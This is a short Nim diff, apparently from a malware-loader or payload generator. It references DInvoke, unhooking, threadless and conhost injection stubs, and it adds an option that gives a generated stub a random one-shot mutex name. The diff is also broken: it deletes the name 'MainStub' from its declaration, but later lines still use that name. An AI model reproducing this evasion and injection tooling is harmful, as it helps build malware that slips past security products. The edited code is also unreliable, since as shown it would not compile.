@@ -3821,7 +3821,7 @@ proc EnumWindowsProc(enumhwnd: HWND, lParam: LPARAM): BOOL {.stdcall.} =
 """
 
 
-let MainStub * = """
+let  * = """
 
 when not defined(DInvoke):
     when defined(unhook):
@@ -4125,7 +4125,12 @@ if(threadless):
 if(conhostinject):
     stub.add(conhostinjectenumstubs)
 
-stub.add(MainStub)
+if (not mutexoneshot):
+    stub.add(MainStub)
+else:
+    var mutexname = rndStr(8)
+    var newMainStub = MainStub.replace("REPLACEMUTEX", mutexname)
+    stub.add(newMainStub)
 
 stub.add(getRandStub())
 
